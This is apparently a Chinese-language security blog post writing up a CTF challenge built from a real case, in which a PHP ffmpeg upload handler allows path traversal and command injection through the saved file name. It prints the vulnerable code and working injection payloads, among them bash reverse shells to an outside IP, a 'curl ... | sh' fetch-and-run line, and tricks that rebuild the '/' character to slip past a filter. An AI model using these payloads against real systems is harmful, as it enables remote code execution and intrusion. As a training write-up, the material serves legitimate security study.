---
title: "每日一问：记一次命令注入RCE"
date: 2020-07-10T13:49:28+08:00
draft: false
tags:
- 渗透测试
- CTF
series:
-
categories:
- 渗透测试
---

在qq群里提出了一个**每日一问**的活动，目的是拓展渗透实战思路，问题不限于渗透、审计、红队、逆向。这篇文章是昨天晚上临时由实战环境改的一个CTF题。
<!--more-->

## 题目
模拟真实环境在群里出了一道CTF题当作**每日一问**，代码形如：

```php
<?php
header('Content-Type: text/html; charset=utf-8');
error_reporting(0);
$upload_dir = 'uploads/';
$isFfmpeg = isset($_POST['isFfmpeg']) ? (boolean)($_POST['isFfmpeg']) : false;
$save = isset($_POST['save']) ? $upload_dir . $_POST['save'] : false;
$filename = isset($_FILES['filename']) ? $_FILES['filename']['name'] : false;
if ($isFfmpeg && isset($_FILES)) {
    if ($filename && $save && $_FILES['filename']["type"] == 'video/blob') {
        if (move_uploaded_file($_FILES['filename']["tmp_name"], $save)) {
            $last_line = exec("ffmpeg -i " . $save . " -hide_banner");
           // echo 'success';
        } else {
            //echo 'error';
            unlink($save);
            unlink($_FILES['filename']['tmp_name']);
        }
    }
} else {
    show_source(__FILE__);
}
```
环境是oneinstack的集成环境，网站目录位于`/data/wwwroot/default/index.php`，index.php是root权限写入的。

## 题解思路

php文件很明确可以看出来两个洞：
1. 任意文件上传
2. 命令注入

首先尝试任意文件上传，直接怼上去shell试试，构造请求包：
![image.png](https://y4er.com/img/uploads/20200710137293.png)

访问 http://123.57.223.30/uploads/aa.php 报404，直接访问 http://123.57.223.30/uploads/ 没有这个目录，分析之后发现是`move_uploaded_file`的问题，当不存在uploads目录时会走else分支。

尝试跨目录`../`，shell应该在 http://123.57.223.30/aa.php 访问发现还是404。全站应该没有写入权限。只能走命令注入这条路了。

命令注入的关键点在于`move_uploaded_file`，首先找可写目录，比如`/tmp/`，因为不知道当前的绝对路径，我们可以用尽可能多的`../`跨到tmp，形如：
![image.png](https://y4er.com/img/uploads/20200710136835.png)

确实可行
![image.png](https://y4er.com/img/uploads/20200710132750.png)

这样走到exec之后注入，dnslog带外
![image.png](https://y4er.com/img/uploads/20200710136674.png)

![image.png](https://y4er.com/img/uploads/20200710131443.png)

这个时候上传的文件名为
![image.png](https://y4er.com/img/uploads/20200710131495.png)

尝试常规的bash反弹shell

```
bash -i >& /dev/tcp/ip/8080 0>&1
```
发包后没收到shell，因为`/`的问题，在`move_uploaded_file`的时候会报错，走不到exec()。

这个时候就是体现姿势的时候了。群友给了几个姿势

```
/../../../../../tmp/xx;curl 10.10.10.10 |sh ;
../../../../../../tmp/asdfasd.sh;bash $(php -r "print(chr(47));")tmp$(php -r "print(chr(47));")a.sh;
/../../../../../tmp/xx;bash -i >& ${PWD:0:1}dev${PWD:0:1}tcp${PWD:0:1}123.57.223.30${PWD:0:1}8080 0>&1;
echo `echo Lwo=|base64 -d`tmp
```

1. curl的原理是直接通过管道符执行curl的结果
2. 先传一
![image.png](https://y4er.com/img/uploads/20200710133042.png)
![image.png](https://y4er.com/img/uploads/20200710137327.png)

## 上帝视角
主要就是命令注入和`move_uploaded_file`在Linux下的绕过。回过头看Linux权限问题
![image.png](https://y4er.com/img/uploads/20200710138573.png)
index.php为root所属，其他用户只有读权限，不可写。完美复现实战中碰到的苛刻环境，利用还算简单，重点是通过bash配合其他命令进行绕过特殊字符串。

**文笔垃圾，措辞轻浮，内容浅显，操作生疏。不足之处欢迎大师傅们指点和纠正，感激不尽。**